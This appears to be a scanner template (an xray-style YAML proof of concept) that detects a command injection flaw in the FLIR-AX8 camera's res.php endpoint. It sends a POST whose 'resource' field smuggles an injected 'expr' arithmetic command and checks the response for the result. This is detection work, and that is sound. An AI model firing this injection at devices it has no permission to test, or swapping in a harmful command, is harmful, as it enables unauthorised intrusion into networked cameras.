expression: r0()
id: flix-ax8-command-injection
info:
  author: icey_(https://github.com/iceyjchen/)
  description: "FLIR-AX8 res.php \u5B58\u5728\u547D\u4EE4\u6CE8\u5165\u6F0F\u6D1E\n\
    app=\"FLIR-FLIR-AX8\"\n"
  name: FLIR-AX8 res.php
  reference:
  - http://wiki.peiqi.tech/wiki/iot/%E8%8F%B2%E5%8A%9B%E5%B0%94/FLIR-AX8%20res.php%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
      - r2)))
    request:
      body: 'action=node&resource=;expr%20{{r1}}%20-%20{{r2}}

        '
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: POST
      path: /res.php
set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
